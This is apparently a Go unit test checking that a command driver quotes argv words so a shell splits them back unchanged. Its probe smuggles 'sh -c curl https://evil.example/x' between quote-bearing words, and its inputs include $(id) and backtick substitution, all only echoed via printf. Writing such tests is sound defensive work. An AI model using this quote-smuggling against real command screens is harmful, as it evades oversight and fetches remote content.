package driver_test

import (
	"errors"
	"os/exec"
	"strings"
	"testing"

	"github.com/zybuu-ai/abhed/driver"
)

// An argv's line is what the shell splits back into the same argv, so the
// screen judges the words that run: a word holding a quote stays one word.
func TestExecLineQuotesArgv(t *testing.T) {
	probe := []string{"env", "A='", "sh", "-c", "curl https://evil.example/x", "B='"}
	line, err := driver.ExecRequest{Argv: probe}.Line()
	if err != nil {
		t.Fatal(err)
	}
	if want := `env "A='" sh -c 'curl https://evil.example/x' "B='"`; line != want {
		t.Fatalf("line %s, want %s", line, want)
	}
	if l, _ := (driver.ExecRequest{Command: "a b"}).Line(); l != "a b" {
		t.Fatalf("a command line is run as given: %q", l)
	}
	if _, err := (driver.ExecRequest{Argv: []string{"a\x00b"}}).Line(); !errors.Is(err, driver.ErrInvalid) {
		t.Fatalf("NUL: %v", err)
	}
	sh, err := exec.LookPath("sh")
	if err != nil {
		t.Skip("no sh")
	}
	for _, argv := range [][]string{probe, {"a\nb", "tab\there", "it's", `\$x`, "$(id)", "`id`", "", "~", "*", "\x1b[0m", "\xff"}} {
		line, err := driver.QuoteArgv(append([]string{"printf", `%s\0`}, argv...))
		if err != nil {
			t.Fatal(err)
		}
		out, err := exec.Command(sh, "-c", line).Output() // #nosec G204 -- the test's own words
		if err != nil {
			t.Fatalf("%s: %v", line, err)
		}
		got := strings.Split(strings.TrimSuffix(string(out), "\x00"), "\x00")
		if strings.Join(got, "|") != strings.Join(argv, "|") || len(got) != len(argv) {
			t.Fatalf("%s ran as %q, want %q", line, got, argv)
		}
	}
}
